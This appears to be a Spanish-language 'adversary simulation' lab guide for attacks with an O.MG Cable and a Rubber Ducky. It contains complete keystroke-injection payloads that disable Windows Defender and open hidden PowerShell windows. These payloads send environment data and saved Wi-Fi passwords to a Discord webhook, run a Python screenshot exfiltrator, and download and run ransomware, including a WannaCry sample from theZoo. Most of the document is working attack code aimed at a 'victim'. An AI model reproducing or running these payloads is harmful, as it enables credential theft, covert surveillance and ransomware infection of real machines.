Bienvenid@s al laboratorio de simulación de adversarios con herramientas de HardwareHacking



Las herramientas a utilizar serán:


* OMG Cable tipo USB-C

* RubberDucky V3

* Ransom0 Project - Malware Ajustado
Recursos e instrucciones: https://github.com/H4ckPyUN/Ciberseguridad/tree/2ff98c8cd637f7d74011af0a8d9c0ddb70b21dc1/Labs%20Ciberseguridad/Simulaci%C3%B3n%20de%20adversarios%20HardwareHacking/Ransom0_ProjectUN


Antes de iniciar necesitamos:

1. Crear una cuenta en PayloadStudio aplicación que hará de IDE donde compilaremos nuestras cargas.
https://payloadstudio.hak5.org/community/

Ya con nuestra cuenta nos será posible compilar nuestros payloads en nuestras herramientas de pentesting. Para este caso usaremos la interfaz para compilar en RubberDucky.


Cabe mencionar que las herramientas que utilizaremos para este laboratorio en nuestros dispositivos son detectadas como teclados, y bajo esa funcionalidad hay que operarlas, por lo cuál es muy importante para nosotros haber hecho toda una etapa de reconomiento donde sepamos su distribución para ejecutar las cargas en la nomenclatura correcta y tener en cuenta la versión de powerShell donde aseguraremos una ejecución plena de los scripts.


2. El siguiente es un payload que debe pegarse sobre el IDE payloadstudio, compilarse y descargarse para su posterior activación.

DELAY 1000
CTRL ESC
DELAY 200
STRING Defender
DELAY 200
ENTER
DELAY 1000
ENTER
DELAY 200
TAB
DELAY 200
TAB
DELAY 200
TAB
DELAY 200
TAB
DELAY 200
ENTER
DELAY 500
SPACE
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
ENTER
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500
TAB
DELAY 500
TAB
DELAY 500
SPACE
DELAY 500
ALT F4
ESC

El payload anterior está hecho para SO Win10 y distribuciones de teclado en inglés pero puede funcionar en teclados con distribución en español. Este puede ser descargado como recurso dentro de la misma carpeta del laboratorio (Inject.bin).

Una vez hayamos desactivado la seguridad del SO, nuestro atacante en sitio tendrá que buscar la oportunidad para conectar el OMG Cable para iniciar con inyección remota de código.



3. Creada la oportunidad para que el atacante introdujera el cable en la víctima, nuestro compañero tendrá que garantizar por el mayor tiempo posible una segura ejecución de los payloads.

El cable levantará una red wifi comúnmente con SSID: O.MG
La clave por defecto es: 12345678


4. Una vez enlazados nos conectaremos al dispositivo por la IP: 192.168.4.1

Esto nos llevará a una aplicación web que será nuestro IDE, Keylogger, monitor de logs y panel de configuración del dispositivo.


5. Enlistamos nuestros Payloads:

DUCKY_LANG US
DELAY 2000

GUI r 
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 500
STRING New-Item -Path 'C:\tmp' -ItemType Directory
ENTER
DELAY 500
STRING Invoke-RestMethod -Uri "https://discord.com/api/webhooks/TU_TOKEN_AQUI" -Method Post -Body @{content="Nueva versión de PowerShell disponible:"; file = (Get-Content "C:\tmp\version.txt" -Raw | Out-String | ConvertTo-Base64); filename="version.txt"} -ContentType "application/json"
DELAY 300
ENTER
STRING exit
DELAY 200
ENTER

El siguiente comando mediante un token de discord  enviará la versión de powerShell al atacante a un webhook anteriormente creado. Esto nos crea un directorio en C: donde almacenará nuestro malware para su posterior ejecución. La carga obtiene la versión de powershell para poder ajustar nuestros payloads a las configuraciones de la víctima


6. Antes de realizar la infección hagamos algo de exfiltración de datos y reconocimiento de víctima.

DUCKY_LANG US
DELAY 2000

GUI r 
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 500
STRING $url="YOUR DISCORD WEBHOOK";dir env: >> stats.txt; Get-NetIPAddress -AddressFamily IPv4 | Select-Object IPAddress,SuffixOrigin | where IPAddress -notmatch '(127.0.0.1|169.254.\d+.\d+)' >> stats.txt;(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize >> stats.txt;$Body=@{ content = "$env:computername Stats from Ducky/Pico"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@stats.txt" $url ; Remove-Item '.\stats.txt';exit
DELAY 500
ENTER
STRING exit
DELAY 200
ENTER

* Este payload nos envía al webhook anteriormente creado más información de la víctima y el equipo.


7. También podemos tomar capturas de pantalla:

El siguiente script hecho en python realiza exfiltración de snapshots a sistema.
Creando un archivo .py configuramos el siguiente script:
Como recurso puede ser descargado: https://github.com/H4ckPyUN/Ciberseguridad/blob/main/Labs%20Ciberseguridad/Simulaci%C3%B3n%20de%20adversarios%20HardwareHacking/SnapshotPyFile/script.py

import pyautogui
from time import sleep
import requests


# YOUR DISCORD WEBHOOK
discord_webhook = ""

# Edit this variables as you want
SCREENSHOTS = 10
TIMING = 5

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    with open("screenshot.png", "rb") as f:
        foto = f.read()

    richiesta = {
        "username": "ExfiltrateComputerScreenshot"
    }

    # Send the message by attaching the photo
    response = requests.post(discord_webhook, data=richiesta, files={"Screen#"+str(i)+".png": foto})

    # Useful for debugging
    #if response.status_code == 200:
    #     print("Photo successfully sent!")
    #else:
    #     print("Error while submitting photo." + str(response.status_code))


7.1 Su descarga también puede ser hecha desde github.


DUCKY_LANG US
DELAY 2000

GUI r
DELAY 1000
STRING powershell -WindowStyle Hidden
ENTER
DELAY 2000
STRING $url = "https://github.com/H4ckPyUN/Ciberseguridad/blob/main/Labs%20Ciberseguridad/Simulaci%C3%B3n%20de%20adversarios%20HardwareHacking/SnapshotPyFile/script.py"
DELAY 200
ENTER
STRING $destino = "C:\tmp"
DELAY 200
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile "$destino\script.py" 
DELAY 200
ENTER

7.2 Descargado una vez el archivo procedemos a su ejecución.

DUCKY_LANG US
DELAY 2000

GUI r
DELAY 200
STRING powershell  -WindowStyle Hidden
DELAY 200
ENTER
DELAY 300
STRING cd C:\tmp
DELAY 200
ENTER
STRING python .\script.py
DELAY 200
ENTER


8. Ejecutamos la descarga de nuestro malware una vez hecho el reconomiento.

DUCKY_LANG US
DELAY 2000

GUI r 
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 500
STRING $url = "https://github.com/H4ckPyUN/Ciberseguridad/blob/main/Labs%20Ciberseguridad/Simulaci%C3%B3n%20de%20adversarios%20HardwareHacking/ransom0.exe"
DELAY 500
ENTER
STRING $destino = "C:\tmp"
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile "$destino\malware.exe"
DELAY 500
ENTER
STRING EXIT
DELAY 200
ENTER

#El siguiente payload permite descargar malware desde el repositorio TheZoo aprovechando su disponibilidad.

DUCKY_LANG US
DELAY 2000

GUI r 
DELAY 500
STRING powershell -WindowStyle Hidden
ENTER
DELAY 500
STRING $url = "https://github.com/ytisf/theZoo/raw/master/malware/Binaries/Ransomware.WannaCry_Plus/Ransomware.WannaCry_Plus.zip"
DELAY 500
ENTER
STRING $destino = "C:\tmp"
DELAY 500
ENTER
STRING $sieteZipExe = "C:\Program Files\7-Zip\7z.exe"
DELAY 500
ENTER
STRING Invoke-WebRequest -Uri $url -OutFile "$destino\Ransomware.WannaCry_Plus.zip"
DELAY 500
ENTER
STRING & $sieteZipExe x "$destino\Ransomware.WannaCry_Plus.zip" -o"$destino\descomprimido" -p"infected"
DELAY 1000
ENTER
STRING EXIT
DELAY 200
ENTER

* El Payload está hecho para versiones de PowerShell 5 o posteriores. 



9. Obtenida toda la información necesaria de la victima, procedemos con la infección remota.

DUCKY_LANG US
DELAY 2000

GUI r
DELAY 200
STRING  C:\tmp\malware.exe -WindowStyle Hidden
DELAY 200
ENTER



Y es así como en un corto periodo de tiempo un equipo descuidado se vuelve un vector de ataque.